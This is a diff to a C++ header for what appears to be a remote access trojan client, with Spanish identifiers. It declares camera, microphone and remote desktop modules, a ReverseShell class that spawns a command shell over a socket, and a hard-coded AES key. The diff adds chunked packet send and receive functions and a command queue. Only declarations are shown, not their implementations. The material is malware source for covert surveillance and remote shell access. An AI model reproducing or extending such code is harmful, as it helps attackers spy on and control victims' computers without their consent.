@@ -7,6 +7,17 @@
 #include "mod_camara.hpp"
 #include "mod_remote_desktop.hpp"
 
+struct Paquete {
+	u_int uiTipoPaquete;
+	u_int uiTamBuffer;
+	u_int uiIsUltimo;
+	std::vector<char> cBuffer;
+};
+
+struct Paquete_Queue {
+	std::vector<char> cBuffer;
+	u_int uiTipoPaquete;
+};
 
 class ReverseShell;
 class Mod_Mic;
@@ -19,7 +30,7 @@ class Cliente {
 		std::mutex mtx_running;
 		std::mutex mtx_queue;
 		std::mutex mtx_kill;
-
+		
 		std::thread p_thQueue;
 
 		unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
@@ -38,8 +49,11 @@ class Cliente {
 		std::ofstream ssArchivo;
 		FILE *fpArchivo = nullptr;
 
+		//Map para armar los paquetes entrantes
+		std::map<int, std::vector<char>> paquetes_Acumulados;
+
 		//Queue para comandos recibidos
-		std::queue<std::vector<char>> queue_Comandos;
+		std::queue<Paquete_Queue> queue_Comandos;
 
 		bool isRunning = true;
 		bool isQueueRunning = true;
@@ -106,8 +120,12 @@ class Cliente {
 		void CerrarConexion();
 
 		//Socket wraps
+		int recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags);
 		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
-		int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
+		int cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* err_code);
+		void m_SerializarPaquete(const Paquete& paquete, char* cBuffer);
+		void m_DeserializarPaquete(const char* cBuffer, Paquete& paquete);
+		int cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code, int iTipoPaquete);
 
 
 		//AES
@@ -116,10 +134,14 @@ class Cliente {
 
 		void iniPacket();
 
+		//Proceso de paquetes
 		void MainLoop();
 		void Process_Queue();
 		void Spawn_QueueMan();
-		void Procesar_Comando(std::vector<char>& cBuffer);
+		void Add_to_Queue(const Paquete_Queue& paquete);
+		void Procesar_Comando(const Paquete_Queue& paquete);
+		void Procesar_Paquete(const Paquete& paquete);
+		
 		void DestroyClasses();
 
 		bool m_isRunning() {
@@ -145,16 +167,16 @@ class Cliente {
 
 class ReverseShell {
 	private:
-		Cliente* copy_ptr;
 		std::mutex mutex_shell;
 		bool isRunning = false;
 		PROCESS_INFORMATION pi;
 		HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
 		std::thread tRead;
 	public:
-		ReverseShell(Cliente* nFather) : copy_ptr(nFather) {}
+		ReverseShell(Cliente* nFather) : sckSocket(nFather->sckSocket) {}
 		SOCKET sckSocket;
 		bool SpawnShell(const char* pStrComando);
+		void StopShell();		
 		void TerminarShell();
 
 		void thEscribirShell(std::string pStrInput);
